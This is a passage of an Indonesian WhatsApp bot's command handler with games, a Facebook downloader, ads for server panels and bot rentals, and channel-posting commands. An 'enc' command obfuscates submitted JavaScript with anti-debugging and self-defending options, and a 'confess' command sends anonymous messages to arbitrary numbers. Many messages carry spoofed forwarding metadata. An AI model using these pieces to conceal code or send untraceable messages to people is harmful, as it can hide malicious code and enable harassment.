if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
case 'siapakahaku': case 'sa':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in tebakgambar) return Reply('Beresin dulu game Tebak Gambar kamu ಠ⁠︵⁠ಠ');
if (from in tebakanime) return Reply('Beresin dulu game Tebak Anime kamu ಠ⁠︵⁠ಠ');
if (from in tebakkata) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakkalimat) return Reply('Beresin dulu game Tebak Kalimat kamu ಠ⁠︵⁠ಠ');
if (from in susunkata) return Reply('Beresin dulu game Susun Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebaklagu) return Reply('Beresin dulu game Tebak Lagu kamu ಠ⁠︵⁠ಠ');
if (from in tebaklirik) return Reply('Beresin dulu game Tebak Lirik kamu ಠ⁠︵⁠ಠ');
if (from in tebakkimia) return Reply('Beresin dulu game Tebak Kata kamu ಠ⁠︵⁠ಠ');
if (from in tebakbendera) return Reply('Beresin dulu game Tebak Bendera kamu ಠ⁠︵⁠ಠ');
if (from in asahotak) return Reply('Beresin dulu game Asah Otak kamu ಠ⁠︵⁠ಠ');
if (from in kuis) return Reply('Beresin dulu game Kuis kamu ಠ⁠︵⁠ಠ');

var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await Reply(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) Reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
case 'caklontong':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in caklontong) return Reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await Reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) Reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
case 'math': case 'kuismath':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
if (!global.game) return Reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.botsetting* lalu vote on`) 
if (from in kuismath) return Reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./assets/game/math')
if (!q) return Reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return Reply('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.Reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await Reply(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) Reply(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
case 'family100': case 'f100':
//if (!isRegistered) return registerbut(noregis)
if(!m.isGroup) return onlyGroup()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await Reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
Reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By ditss

case "facebook": case "fb": {
if (!text.includes("facebook.com")) return m.reply("Masukan link facebook!")
try {
 axios({ "method": "GET", "url": "https://mannoffc-x.hf.space/download/facebook", "params": { "url": text }}).then(_ => {
 Ditss.sendMessage(m.chat, { video: { url: _.data.result.video }, caption: "" }, { quoted: m })
 })
} catch ({ message }) {
 m.reply(message)
}
}
break

case'ramlist': case 'listpanel': case 'panel':{
 
//if (!isRegistered) return registerbut(noregis)
let u = ` ⟣────────────`
let list1 = `• *${monospa('Paket [ 1 ]')}* 📦

> _RAM 4 GB_
> _DIKS 4190_
> _CPU 350%_
> _4K BULAN_`
let list2 = `• *${monospa('Paket [ 2 ]')}* 📦

> _RAM 5 GB_
> _DIKS 5190_
> _CPU 450%_
> _5K BULAN_`
let list3 = `• *${monospa('Paket [ 3 ]')}* 📦

> _RAM 6 GB_
> _DIKS 6190_
> _CPU 550%_
> _6K BULAN_`
let list4 = `• *${monospa('Paket [ 4 ]')}* 📦

> _RAM 7 GB_
> _DIKS 7190_
> _CPU 650%_
> _7K BULAN_ `
let list5 = `• *${monospa('Paket [ 5 ]')}* 📦

> _RAM 8 GB_
> _DIKS 8190_
> _CPU ∞%_
> _9K BULAN_`
let list6 = `• *${monospa('Paket [ 6 ]')}* 📦

> _RAM 9 GB_
> _DIKS O190_
> _CPU ∞%_
> _10K BULAN_`
let list7 = `• *${monospa('Paket [ 7 ]')}* 📦

> _RAM ∞ GB_
> _DIKS ∞_
> _CPU ∞%_
> _12K BULAN_`
let mmm = `
╰◈ Ram Vps : 16gb
╰◈ Core Vps : 4
╰◈ Garansi : 30 Day
╰◈ Terawat : ✓
╰◈Anti Maling : ✓`
let info = `${monospace(mmm)}`


 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '0@newsletter',
			newsletterName: 'asuma the panel', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'asuma -CMD', 
 thumbnailUrl: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg', 
 sourceUrl: 'https://tiktok.com/@paadit',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: 'List Panel',
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list1}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: "Buy Sever!.. 🐣",
 id: ".bayar4gb"
 }),
}
 ]
 })
 },
 // BATAS CLONE KODE
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list2}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: `Buy Sever!.. 🐣`,
 id: `.bayar5gb`
 }),
}
 ]
 })
 },
 // BATAS CLONE KODE
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list3}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: `Buy Sever!.. 🐣`,
 id: `.bayar6gb`
 }),
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list4}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: `Buy Sever!.. 🐣`,
 id: `.bayar7gb`
 }),
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list5}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: `Buy Sever!.. 🐣`,
 id: `.bayar8gb`
 }),
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list6}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: `Buy Sever!..`,
 id: `.bayar9gb`
 }),
}
 ]
 })
 },
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list7}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/8b49f9438b266fc7a9730.jpg' } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
 name: "quick_reply",
 buttonParamsJson: JSON.stringify({
 display_text: `Buy Sever!..`,
 id: `.bayarunli`
 }),
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: m })
Ditss.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
if (m.isGroup) return Reply('*`maybee`harap pembelian di private chat*')
}
break

case 'autoai':{
Ditss.CAI = Ditss.CAI ? Ditss.CAI : {};

 if (!text) return Reply(`*Contoh:* .autoai *[on/off]*`);

 if (text === "on") {
 Ditss.CAI[sender] = {
 messages: []
 };
 m.reply(`[ ✓ ] sukses mode*\`asuma ai\`* : ᴀᴋᴛɪғ`);
 } else if (text === "off") {
 delete Ditss.CAI[sender];
 m.reply(`[ ✓ ] sukses mode *\`asuma\`* : ɴᴏɴᴀᴋᴛɪғ`);
 }
};
break

case 'confes': case 'menfes': case 'menfess': case 'confess': {
if (m.isGroup) return Reply(`Khusus Di Private Chat!!`)
 global.db.menfess = global.db.menfess ? global.db.menfess : {}
 if (!text) return Reply(` ${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
 let [jid, name, msg] = text.split`|`
 if ((!jid || !name || !msg)) return Reply(`${prefix + command} 628xxxxx | orang | Bayar Utang Lu`)
 let p = (await Ditss.onWhatsApp(jid))[0] || {}
 if (!p.exists) return Reply('❌ Nomer Yang Kamu Masukan Salah')
 if (p.jid == m.sender) return Reply('Itu Nomer Lu Dodol!!')
 let mf = Object.values(global.db.menfess).find(mf => mf.status === true)
 if (mf) return !0
 let heri = `${monospa(`${name.trim()}`)}`
 let id = +new Date
 let txt = `📨 Hay kamu dapat pesan dari seseorang 👋 \n\nnama: *${name.trim()}*\nPesan: `
 txt += `_${msg.trim()}_\n\nMau balas pesan ini kak? bisa kok kak. tinggal ketik pesan kakak lalu kirim, nanti saya sampaikan ke ${heri}`
 
 await Ditss.sendMessage(p.jid, {
 text: txt,
 contextInfo: {
 externalAdReply: {
 title: 'Confess',
 body: '',
 thumbnailUrl: 'https://telegra.ph/file/5413eed27c6af00fa7273.jpg',
 sourceUrl: `${global.linkSaluran}`,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }).then(() => {
 Reply(`*Berhasil Mengirim Pesan Menfess!!*`) 
 global.db.menfess[id] = {
 id,
 from: m.sender,
 name,
 receiver: p.jid,
 msg,
 status: false
 }
 return !0
 })
 }
 break

case "sewabot": case "sewa": {
const url1 = `https://files.catbox.moe/sgelxu.jpg`;
const url2 = `https://files.catbox.moe/sgelxu.jpg`;
const url3 = `https://files.catbox.moe/sgelxu.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: Ditss.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 
 body: { text: `hai kak *${pushname}*, kalo mau sewa klik di bawah ini yaa><\nkalo ga punya uang bisa kok free xixixi` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*1 minggu -*\n\n• \`price: 5k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa 1 minggu","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+1+Minggu","webview_presentation":null}`,
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Bulan -*\n\n• \`price: 10k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa 1 bulan","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+1+Bulan","webview_presentation":null}`,
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- Permanen -*\n\n• \`price: 20k\`" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"sewa","url":"https://wa.me/${global.owner}?text=Bang+Mau+Sewa+Bot+Permanen","webview_presentation":null}`,
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await Ditss.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break

/*case 'sider':{

 const lama = 86400000 * 7
 const now = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" })
 const milliseconds = new Date(now).getTime()

 let member = groupMetadata.participants.map(v => v.id)
 let total = 0
 const sider = []

 for (let i = 0; i < member.length; i++) {
 let users = groupMetadata.participants.find(u => u.id === member[i])
 if ((typeof global.db.data.users[member[i]] === 'undefined' || milliseconds - global.db.data.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
 if (typeof global.db.data.users[member[i]] !== 'undefined') {
 if (global.db.data.users[member[i]].banned === true) {
 total++
 sider.push(member[i])
 }
 } else {
 total++
 sider.push(member[i])
 }
 }
 }

 if (!args[0]) {
 return Ditss.reply(m.chat, `🚩 Use the command with options:\n1. \`gcsider --list\` to list inactive members\n2. \`gcsider --kick\` to kick inactive members`, m)
 }

 if (args[0] === '--list') {
 if (total === 0) return Ditss.reply(m.chat, `🚩 *There are no siders in this group.*`, m)
 
 const groupName = await Ditss.getName(m.chat)
 const message = `*${total}/${member.length}* anggota grup *${groupName}* adalah sider:\n${sider.map(v => ' ○ @' + v.replace(/@.+/, '')).join('\n')}`

 return Ditss.reply(m.chat, message, m, {
 contextInfo: {
 mentionedJid: sider
 }
 })
 }

 if (args[0] === '--kick') {
 if (total === 0) return Ditss.reply(m.chat, `🚩 *There are no siders to kick in this group.*`, m)

 for (const user of sider) {
 try {
 await Ditss.groupParticipantsUpdate(m.chat, [user], 'remove')
 } catch (e) {
 throw e 
 }
 }

 return Ditss.reply(m.chat, `🚩 Successfully removed *${total}* inactive members from the group.`, m)
 }

 return Ditss.reply(m.chat, `🚩 Invalid option. Use \`--list\` to view inactive members or \`--kick\` to remove them.`, m)
}
break
*/
case "out": case "leave": case "leavegc": {

if (!m.isGroup) return Reply(mess.group)
await Reply("Okay Bang")
await sleep(3000)
await Ditss.groupLeave(m.chat)
}
break

case 'sekerip': case 'sc': case 'script':{
    Reply('waitt')
//if (!isRegistered) return registerbut(noregis)
const ownedr = "6285866435726@s.whatsapp.net"
let u = `*\`</> 乂INPO SCRIPT乂 </>\`*\n
https://whatsapp.com/channel/0029Vawm0Vp5Ejy1kfjJdD2S\n${readmore} *@${ownedr.split("@")[0]}*`
let dits = ``
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '120363383395435351@newsletter',
			newsletterName: 'HangzMD Script', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: Ditss.decodeJid(Ditss.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: `${u}`, 
 thumbnailUrl: 'https://pomf2.lain.la/f/rfqvajh5.jpg', 
 sourceUrl: 'https://tiktok.com/@paadit',
 mediaType: 2,
 renderLargerThumbnail: true
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `${u}`,
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [ 
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: ``,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: ppuser } }, { upload: Ditss.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Dev Script💥\",\"url\":\"https:/wa.me/6285866435726\",\"merchant_url\":\"https:/wa.me/
6285866435726\"}`
}, 
{ 
 "name": "quick_copy",

 "buttonParamsJson": `{"display_text":"jangan di pencet","id":".menu"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"gabung saluran\",\"url\":\"https://whatsapp.com/channel/0029Vawm0Vp5Ejy1kfjJdD2S\",\"merchant_url\":\"https://www.google.com\"}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: fkontak2 })
Ditss.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

/*case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya"))
await Sky.sendMessage(idSaluran, {text: text})
m.reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break*/

case"upch": case 'upsaluran':{
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply("teks?")
Ditss.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
Ditss.sendMessage(`${global.idSaluran}`, {
text: text,
contextInfo: {
forwardingScore: 999, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.packname}`,
newsletterJid: "120363383395435351@newsletter",
serverMessageId: null,
newsletterNe: `${global.botname2}`
},
externalAdReply: {
showAdAttribution: true,
title: `Owner Bot`, 
body: `Info Dari Owner`, 
sourceUrl: 'https://music.youtube.com/playlist?list=PLYApgpZSQBgUHJsW0NFgCJVxwRI0fC1SR',
thumbnailUrl: 'https://telegra.ph/file/1711cf5370bcf6d1db9f1.jpg',
}
}
},
{quoted: m})
await sleep(2000)
Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case"upgc": case 'upgrup':{
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply("ketik .upgc id grup| chat")
    idgrupcokk = text.split("|")[0]
    text2929 = text.split("|")[1]
Ditss.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
Ditss.sendMessage(`${idgrupcokk}`, {
text: `${text2929}`,
contextInfo: {
forwardingScore: 999, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.packname}`,
newsletterJid: "120363383395435351@newsletter",
serverMessageId: null,
newsletterNe: `${global.botname2}`
},
externalAdReply: {
showAdAttribution: true,
title: `Owner Bot`, 
body: `Info Dari Owner`, 
sourceUrl: 'https://music.youtube.com/playlist?list=PLYApgpZSQBgUHJsW0NFgCJVxwRI0fC1SR',
thumbnailUrl: 'https://telegra.ph/file/1711cf5370bcf6d1db9f1.jpg',
}
},
})
await sleep(2000)
Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case 'enc': {
   const fs = require('fs');
   const JavaScriptObfuscator = require('javascript-obfuscator');
   async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
            const obfuscationResult = JavaScriptObfuscator.obfuscate(query, {
                compact: true,
                controlFlowFlattening: true,
                controlFlowFlatteningThreshold: 0.75,
                numbersToExpressions: true,
                simplify: true,
                stringArray: true,
                stringArrayThreshold: 1,
                stringArrayEncoding: ['base64'],
                stringArrayIndexShift: true,
                deadCodeInjection: true,
                deadCodeInjectionThreshold: 0.4,
                selfDefending: true,
                disableConsoleOutput: true,
                debugProtection: true,
                debugProtectionInterval: 4000,
                identifierNamesGenerator: 'hexadecimal',
                splitStrings: true,
                splitStringsChunkLength: 10,
                renameGlobals: false,
                transformObjectKeys: true,
                ignoreImports: true
            });

            const watermark = `/* ENC BY HANGZ */\n/* HANGZ OBFUSCATE */\n`;
            let obfuscatedCode = watermark + obfuscationResult.getObfuscatedCode();

            const result = {
                status: 200,
                result: obfuscatedCode,
            };
            resolve(result);
        } catch (e) {
            reject(e);
        }
    });
}
   
    let tex = m.quoted ? m.quoted.text : text;
    if (!tex) return m.reply('Reply atau kirim teksnya!');

    let meg = await obfus(tex);
    let nem = './database/sampah/result.js';
    let enc = meg.result;
    await fs.writeFileSync(nem, enc);
    let t4 = await fs.readFileSync('./database/sampah/result.js');
    m.reply(enc);
    Ditss.sendMessage(m.chat, {
        document: t4,
        mimetype: 'document/application',
        fileName: 'hangz_enc.js',
        fileLength: 2023
    }, {
        quoted: m
    });
}
break

case 'upaudioch':{
if (!isCreator) return m.reply(mess.owner)
if (!/audio/.test(mime)) return m.reply(`khusus audio, .upaudioch Request Dari|Judul Lagu`)
    ngawi = text.split("|")[0]
    bjirrwoila = text.split("|")[1]
 Ditss.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(3000)
Ditss.sendMessage(`${global.idSaluran}`,{
audio: await m.quoted.download(),
ptt: true, 
mimetype: "audio/mpeg", 
fileName: "bot.mp3",
waveform: [0, 153, 0, 494, 976], 
contextInfo: {
forwardingScore: 999, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.packname}`,
newsletterJid: "120363383395435351@newsletter",
serverMessageId: null,
newsletterNe: `${global.botname2}`
},
externalAdReply: {
showAdAttribution: true,
title: `[🎶] - ${bjirrwoila}`, 
body: `Request by ${ngawi}`, 
sourceUrl: 'https://music.youtube.com/playlist?list=PLYApgpZSQBgUHJsW0NFgCJVxwRI0fC1SR',
thumbnailUrl: 'https://telegra.ph/file/1711cf5370bcf6d1db9f1.jpg',
}
}
})
await sleep(2000)
Ditss.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case 'upaudiogc':{
if (!isCreator) return m.reply(mess.owner)
if (!/audio/.test(mime)) return m.reply(`khusus audio, .upaudiogc Id Grup Bukan Ch|Request Dari|Judul Lagu`)
    idgrupcokk = text.split("|")[0]
    requestorang = text.split("|")[1]
    namalagu = text.split("|")[2]
 Ditss.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(3000)
Ditss.sendMessage(`${idgrupcokk}`,{
audio: await m.quoted.download(),
ptt: true, 
mimetype: "audio/mpeg", 
fileName: "bot.mp3",
waveform: [0, 153, 0, 494, 976], 
contextInfo: {
forwardingScore: 999, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.packname}`,
newsletterJid: "120363383395435351@newsletter",
serverMessageId: null,
newsletterNe: `${global.botname2}`
},
externalAdReply: {
showAdAttribution: true,
title: `[🎶] - ${namalagu}`, 
body: `Request by ${requestorang}`, 
sourceUrl: 'https://music.youtube.com/playlist?list=PLYApgpZSQBgUHJsW0NFgCJVxwRI0fC1SR',
thumbnailUrl: 'https://telegra.ph/file/1711cf5370bcf6d1db9f1.jpg',
}
}
})
await sleep(2000)
